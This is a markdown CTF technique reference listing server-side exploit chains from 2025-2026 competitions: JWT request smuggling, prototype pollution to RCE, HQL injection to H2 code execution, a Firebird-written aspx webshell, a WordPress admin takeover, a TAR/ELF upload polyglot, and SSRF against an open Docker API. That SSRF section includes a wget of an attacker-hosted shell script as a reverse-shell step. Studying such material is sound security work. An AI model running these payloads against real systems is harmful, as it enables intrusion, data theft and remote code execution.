# Server-Side Advanced — Part 2 (2025-2026)

Spin-off of `server-side-advanced.md` grouping the 2025-2026 mechanics (hxp 38C3/39C3, SekaiCTF 2025, idekCTF 2025, HTB 2025, Midnightflag 2025, FCSC 2025). New 2025-2026 sections go here to keep `-advanced.md` under 500 lines.


## JWT `base64_decode(strict=false)` Smuggling + NFKD Filename Fold (source: hxp 38C3 phpnotes)

**Trigger:** PHP JWT library calling `base64_decode($sig, false)` (non-strict); keep-alive upstream; Werkzeug/Flask downstream using `secure_filename`.
**Signals:** PHP `$sig = base64_decode($token_parts[2], false)`; `Connection: keep-alive`; `secure_filename` applied to UTF-8 filenames.
**Mechanic:** non-strict b64 silently drops non-base64 bytes → smuggle CR/LF + high-UTF-8 inside the JWT signature payload. Injected `\r\n\r\nGET /ᶠₗₐℊ HTTP/1.1\r\n` smuggles a second request on the keep-alive pipe. NFKD normalisation then folds subscript/exotic letters (`ᶠₗₐℊ`) into ASCII `flag` for the downstream filename — bypasses allow-lists that only checked the decoded name after-the-fact.

## Go Handler Shared Package `err` TOCTOU (source: hxp 38C3 FJWK)

**Trigger:** Go HTTP handler using package-level `var err error` and assigning `err = check(x)` inside the handler (no `:=` re-declaration).
**Signals:** `grep -n 'var err error'` at package scope followed by handlers that write `err = ...` (not `err := ...`).
**Mechanic:** shared `err` across goroutines — a concurrent benign request can zero it between the flawed request's TOCTOU (write `err = someError`) and its check (`if err != nil { deny }`). Win rate ~8 parallel goroutines of each kind over 180s. Fix: local `err := ...` always. Grep rule to automate: `rg 'var err error\b' --type go` + handlers referencing `err =` without `:=`.

## Vite Dev-Server Proto-Pollution → `spawn_sync` RCE (source: SekaiCTF 2025 vite)

**Trigger:** Vite dev server exposing internal endpoints that parse JSON bodies via `object.merge`-style helper; no input validation; dev-mode.
**Signals:** `vite` in `package.json`, routes like `/__vite_ping`, `/@fs/`, `/@vite/client`; merge util in request pipeline.
**Mechanic:** prototype pollution via `__proto__.source` → poisons `Object.prototype.source` → Node reaches `process.binding('spawn_sync')` code path that reads `source` from inherited proto → RCE. Exfil response via polluted response headers. Specific to Vite 4.x/5.x dev builds (prod bundles strip the vulnerable path).

## NFS File-Handle Forgery Across Exported Subtree (source: hxp 38C3 NeedForSpeed)

**Trigger:** NFS export without explicit `subtree_check`; kernel default = `no_subtree_check`; file handle = `(inode:4, gen:4)`.
**Signals:** `/etc/exports` lacks `subtree_check`; handshake capture shows 8-byte file handles.
**Mechanic:** mount export normally, capture a file handle, then forge RPCs pointing to inodes outside the exported subtree. Spoof GID in auth creds (AUTH_SYS) to read `/flag.txt`. Pattern: any NFSv3 export without `subtree_check` lets you read arbitrary filesystem by forging handles.

## JS `String.replace` Single-Match Traversal (source: idekCTF 2025 midi visualizer)

**Trigger:** Node server normalises a user path via `path.replace('/static/', 'uploads/')` (string form, not regex global).
**Signals:** literal string arg to `.replace`; subsequent `fs.readFile(normalized_path)` or `res.sendFile`.
**Mechanic:** `.replace(string, string)` only replaces the **first** match. Payload `/static../uploads/../etc/passwd` collapses incorrectly, escaping the upload dir. Always replace with `/foo/g` regex; grep rule `\.replace\([\"\']` with literal first arg that looks like a path.

## HQLi → H2 `CREATE ALIAS` → jdk.jshell JDWP RCE (source: SekaiCTF 2025 hqli-me)

**Trigger:** Java app with Hibernate HQL concatenating `password`/user fields; H2 on the classpath; JDK with `jdk.jshell.*`; network-isolated container.
**Signals:** `Query.createQuery("FROM User WHERE name='"+u+"'")`; `h2*.jar` in deps; JVM has `jshell` module.
**Mechanic:** HQL escape bypass via `\\" and function(...)` → inject `CREATE ALIAS runme AS 'String x() throws Exception { return new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(new String[]{"sh","-c","id"}).getInputStream())).lines().collect(java.util.stream.Collectors.joining()); }'` — but because network is isolated, use `jdk.jshell.execution.JdiInitiator` to open a *local* JDWP listener, inject Java classes, `ProcessBuilder` RCE; persist output in `Session` and retrieve via normal query.

## WordPress `wp_ajax_nopriv_*` update_option Privilege Escalation (source: HTB University 2025 SilentSnow)

**Trigger:** WP plugin registering `add_action('wp_ajax_nopriv_x', 'handler')` where `handler` calls `update_option($_POST['key'], $_POST['value'])` without `current_user_can()`.
**Signals:** grep plugin source for `wp_ajax_nopriv_` + `update_option($_POST`.
**Mechanic:** unauth POST sets `users_can_register=1`, `default_role=administrator`, then `siteurl`/`template` to attacker domain. Register normally → now admin. Classic WordPress abuse, still recurring in 2025-2026.

## ORM Type-Confusion `{$gt:0}` + Zip-Slip + Unhandled-Promise Poison (source: HTB University 2025 PeppermintRoute)

**Trigger:** Node ORM query like `Model.where({id: req.body.id})` that forwards without type coercion; zip upload extractor writing raw entry paths; any `async` handler whose rejections aren't awaited.
**Signals:** `req.body.id` passed directly to an `.where({})`; `AdmZip`/`unzipper` without `sanitize-filename`; `Promise` calls without `try/await`.
**Mechanic:** chain — (1) `{"id":{"$gt":0}}` returns all rows → mass read → (2) zip-slip upload of `../../routes/flag.js` → (3) trigger unhandled promise rejection on a hot path to crash the worker; PM2 restart reloads the poisoned route. Needs no bug individually; the chain IS the exploit.

## Firebird `ALTER DATABASE ADD DIFFERENCE FILE` → Webshell Write (source: HTB Business 2025 Fire)

**Trigger:** Firebird RDBMS + IIS on same host; SQL user with `ALTER DATABASE`.
**Signals:** port 3050 open, Firebird banner on connect, IIS on 80/443 with aspx executing.
**Mechanic:** `ALTER DATABASE ADD DIFFERENCE FILE '\\?\C:\inetpub\wwwroot\shell.aspx';` then trigger backup flush with controlled blob → arbitrary bytes in web root. IIS picks up the aspx; chain to SeImpersonate → PrintSpoofer → SYSTEM.

## TAR/ELF Polyglot for Upload-to-RCE (source: HTB Business 2025 novacore)

**Trigger:** file upload accepts TAR archives; extractor does traversal-unsafe writes (no `--anchored`); second endpoint `exec()`s uploaded files.
**Signals:** `tarfile.extractall` without `filter=`; filename sanitizer weaker than `os.path.normpath(os.path.join(root, name))` guard.
**Mechanic:** craft a file whose first 262 bytes are a valid TAR header (filename = `../bin/payload`) and whose body is a valid ELF. Extractor places ELF at chosen path; exec endpoint runs it. Produce with:
```bash
python -c "import tarfile,io;t=tarfile.open('x.tar','w');i=tarfile.TarInfo('../bin/p');b=open('sh.elf','rb').read();i.size=len(b);t.addfile(i,io.BytesIO(b));t.close()"
```

## S3 Presigned-URL Path Traversal to Private Prefix (source: HTB Business 2025 Vault)

**Trigger:** API `/download?file=...` returns a presigned S3 URL; bucket has `public/` and `private/` prefixes with `ListBucket` allowed.
**Signals:** redirect to `*.s3.amazonaws.com/?X-Amz-Signature=...`; bucket listing readable at the raw URL.
**Mechanic:** directory listing via `https://bucket.s3.amazonaws.com/?list-type=2&prefix=private/` reveals private keys; supply `../private/<key>` in the presign parameter → server path-joins without canonicalisation → signed URL for private object. Chain: list-bucket + path-traversal in presign parameter.
## SSRF to Docker API RCE Chain (H7CTF 2025)

**Pattern (Moby Dock):** Web app with SSRF vulnerability exposes unauthenticated Docker daemon API on port 2375. Chain SSRF through an internal proxy endpoint to relay POST requests and achieve RCE.

**Step 1 — Discover internal services via SSRF:**
```bash
# Enumerate localhost ports through SSRF
curl "http://target/validate?url=http://localhost:2375/version"
curl "http://target/validate?url=http://localhost:8090/docs"
```

**Step 2 — Extract files from running containers via Docker archive endpoint:**
```bash
# List containers
curl "http://target/validate?url=http://localhost:2375/containers/json"

# Read files from container filesystem (returns tar archive)
curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<container_id>/archive?path=/flag.txt"
```

**Step 3 — Execute commands via Docker exec API (requires POST relay):**

When SSRF only allows GET requests, find an internal endpoint that can relay POST requests (e.g., `/request?method=post&data=...&url=...`).

```bash
# 1. Create exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}\
&url=http://localhost:2375/v1.51/containers/<id>/exec"
# Returns: {"Id": "<exec_id>"}

# 2. Start exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"Detach\":false,\"Tty\":false}\
&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
```

**For reverse shell access:**
```bash
# 1. Download shell script into container
# Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]

# 2. Execute with sh (not bash — busybox containers lack bash)
# Cmd: ["sh", "/tmp/shell.sh"]
```

**Key Docker API endpoints for exploitation:**
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/version` | GET | Confirm Docker API access |
| `/containers/json` | GET | List running containers |
| `/containers/<id>/archive?path=<path>` | GET | Extract files (tar format) |
| `/containers/<id>/exec` | POST | Create exec instance |
| `/exec/<id>/start` | POST | Run exec instance |
| `/images/json` | GET | List available images |
| `/containers/create` | POST | Create new container |

**Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When SSRF is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).

---

